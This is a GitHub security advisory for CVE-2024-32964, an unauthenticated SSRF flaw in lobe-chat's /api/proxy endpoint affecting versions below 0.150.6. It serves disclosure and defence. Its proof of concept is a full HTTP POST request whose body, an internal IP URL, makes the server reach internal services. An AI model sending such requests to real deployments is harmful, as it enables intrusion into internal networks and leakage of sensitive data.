# [C] lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability

## Summary
Severity: Critical
Advisory: GHSA-mxhq-xw3g-rphc
CVE: CVE-2024-32964
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H (CVSS_V3)
Published: 2024-05-10
Source: https://github.com/advisories/GHSA-mxhq-xw3g-rphc
Type: github-advisory

## Affected
- npm: `@lobehub/chat` — affected >=0 <0.150.6

## Details
### Summary
The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.

### Details
* visit https://chat-preview.lobehub.com/settings/agent  
* you can attack all internal services by /api/proxy and get the echo in http response :) 

![image](https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21)

![image](https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91)

![image](https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75)



### PoC
```http
POST /api/proxy HTTP/2
Host: xxxxxxxxxxxxxxxxx
Cookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0
Content-Length: 23
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://chat-preview.lobehub.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://chat-preview.lobehub.com/settings/agent
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7

http://172.23.0.1:8000/
```

### Impact
SSRF ,All users will be impacted.

## References
- https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc
- https://nvd.nist.gov/vuln/detail/CVE-2024-32964
- https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37
- https://github.com/lobehub/lobe-chat
